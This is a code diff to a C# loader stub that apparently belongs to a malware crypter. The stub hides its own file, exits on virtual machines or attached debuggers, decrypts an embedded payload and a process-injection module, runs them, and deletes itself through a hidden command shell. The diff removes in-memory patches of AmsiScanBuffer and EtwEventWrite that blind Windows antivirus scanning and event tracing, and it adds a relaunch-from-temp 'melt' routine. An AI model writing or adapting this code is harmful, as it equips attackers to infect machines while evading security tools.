@@ -15,22 +15,23 @@ namespace namespace_name
 {
     internal class class_name
     {
-        [DllImport("kernel32.dll")]
-        static extern IntPtr LoadLibrary(string lpFileName);
-
-        [DllImport("kernel32.dll")]
-        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-
-        delegate bool virtualprotect_name(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-#if ANTI_DEBUG
-        delegate bool checkremotedebugger_name(IntPtr hProcess, ref bool isDebuggerPresent);
-        delegate bool isdebuggerpresent_name();
-#endif
-
+        static string field_name = Process.GetCurrentProcess().MainModule.FileName;
         static void Main(string[] args)
         {
-            string currentfilename = Process.GetCurrentProcess().MainModule.FileName;
-            File.SetAttributes(currentfilename, FileAttributes.Hidden | FileAttributes.System);
+            File.SetAttributes(field_name, FileAttributes.Hidden | FileAttributes.System);
+
+#if MELT_FILE
+            string batpath = field_name.Replace(".bat.exe", ".bat");
+            if (batpath.IndexOf(Path.GetTempPath(), StringComparison.OrdinalIgnoreCase) != 0)
+            {
+                string newpath = $"{Path.GetTempPath()}\\{Path.GetFileName(batpath)}";
+                File.Copy(batpath, newpath, true);
+                File.Delete(batpath);
+                Process.Start(newpath);
+                exitfunction_name(1);
+            }
+#endif
+
 #if ANTI_VM
             ManagementObjectSearcher searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem");
             ManagementObjectCollection instances = searcher.Get();
@@ -39,7 +40,7 @@ namespace namespace_name
                 string manufacturer = inst["Manufacturer"].ToString().ToLower();
                 if ((manufacturer == "microsoft corporation" && inst["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || manufacturer.Contains("vmware") || inst["Model"].ToString() == "VirtualBox")
                 {
-                    Environment.Exit(1);
+                    exitfunction_name(1);
                 }
             }
             searcher.Dispose();
@@ -54,32 +55,11 @@ namespace namespace_name
             isdebuggerpresent_name IsDebuggerPresent = (isdebuggerpresent_name)Marshal.GetDelegateForFunctionPointer(idpaddr, typeof(isdebuggerpresent_name));
             bool remotedebug = false;
             CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref remotedebug);
-            if (Debugger.IsAttached || remotedebug || IsDebuggerPresent()) Environment.Exit(1);
+            if (Debugger.IsAttached || remotedebug || IsDebuggerPresent()) exitfunction_name(1);
 #endif
 
-            IntPtr vpaddr = GetProcAddress(kmodule, "V" + "i" + "r" + "t" + "u" + "a" + "l" + "P" + "r" + "o" + "t" + "e" + "c" + "t");
-            virtualprotect_name VirtualProtect = (virtualprotect_name)Marshal.GetDelegateForFunctionPointer(vpaddr, typeof(virtualprotect_name));
-            byte[] patch;
-            uint old;
-
-            IntPtr amsimodule = LoadLibrary("a" + "m" + "s" + "i" + "." + "d" + "l" + "l");
-            IntPtr asbaddr = GetProcAddress(amsimodule, Encoding.UTF8.GetString(aesfunction_name(Convert.FromBase64String("amsiscanbuffer_str"), Convert.FromBase64String("key_str"), Convert.FromBase64String("iv_str"))));
-            if (IntPtr.Size == 8) patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
-            else patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
-            VirtualProtect(asbaddr, (UIntPtr)patch.Length, 0x40, out old);
-            Marshal.Copy(patch, 0, asbaddr, patch.Length);
-            VirtualProtect(asbaddr, (UIntPtr)patch.Length, old, out old);
-
-            IntPtr ntdll = LoadLibrary("n" + "t" + "d" + "l" + "l" + "." + "d" + "l" + "l");
-            IntPtr etwaddr = GetProcAddress(ntdll, Encoding.UTF8.GetString(aesfunction_name(Convert.FromBase64String("etweventwrite_str"), Convert.FromBase64String("key_str"), Convert.FromBase64String("iv_str"))));
-            if (IntPtr.Size == 8) patch = new byte[] { 0xC3 };
-            else patch = new byte[] { 0xC2, 0x14, 0x00 };
-            VirtualProtect(etwaddr, (UIntPtr)patch.Length, 0x40, out old);
-            Marshal.Copy(patch, 0, etwaddr, patch.Length);
-            VirtualProtect(etwaddr, (UIntPtr)patch.Length, old, out old);
-
-            string payloadstr = Encoding.UTF8.GetString(aesfunction_name(Convert.FromBase64String("payloadtxt_str"), Convert.FromBase64String("key_str"), Convert.FromBase64String("iv_str")));
-            string runpestr = Encoding.UTF8.GetString(aesfunction_name(Convert.FromBase64String("runpedlltxt_str"), Convert.FromBase64String("key_str"), Convert.FromBase64String("iv_str")));
+            string payloadstr = Encoding.UTF8.GetString(aesfunction_name(Convert.FromBase64String("payloadexe_str"), Convert.FromBase64String("key_str"), Convert.FromBase64String("iv_str")));
+            string runpestr = Encoding.UTF8.GetString(aesfunction_name(Convert.FromBase64String("runpedllexe_str"), Convert.FromBase64String("key_str"), Convert.FromBase64String("iv_str")));
 
             Assembly asm = Assembly.GetExecutingAssembly();
             foreach (string name in asm.GetManifestResourceNames())
@@ -118,14 +98,20 @@ namespace namespace_name
             try { entry.Invoke(null, new object[] { targs }); }
             catch { entry.Invoke(null, null); }
 #endif
+            exitfunction_name(0);
+        }
+
+        static void exitfunction_name(int exitcode)
+        {
             string cmdstr = Encoding.UTF8.GetString(aesfunction_name(Convert.FromBase64String("cmdcommand_str"), Convert.FromBase64String("key_str"), Convert.FromBase64String("iv_str")));
             Process.Start(new ProcessStartInfo()
             {
-                Arguments = cmdstr + currentfilename + "\" & del \"" + currentfilename + "\"",
+                Arguments = cmdstr + field_name + "\" & del \"" + field_name + "\"",
                 WindowStyle = ProcessWindowStyle.Hidden,
                 CreateNoWindow = true,
                 FileName = "cmd.exe"
             });
+            Environment.Exit(exitcode);
         }
 
         static byte[] aesfunction_name(byte[] input, byte[] key, byte[] iv)
@@ -163,5 +149,17 @@ namespace namespace_name
             ms.Dispose();
             return ret;
         }
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr LoadLibrary(string lpFileName);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+        delegate bool virtualprotect_name(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+#if ANTI_DEBUG
+        delegate bool checkremotedebugger_name(IntPtr hProcess, ref bool isDebuggerPresent);
+        delegate bool isdebuggerpresent_name();
+#endif
     }
 }
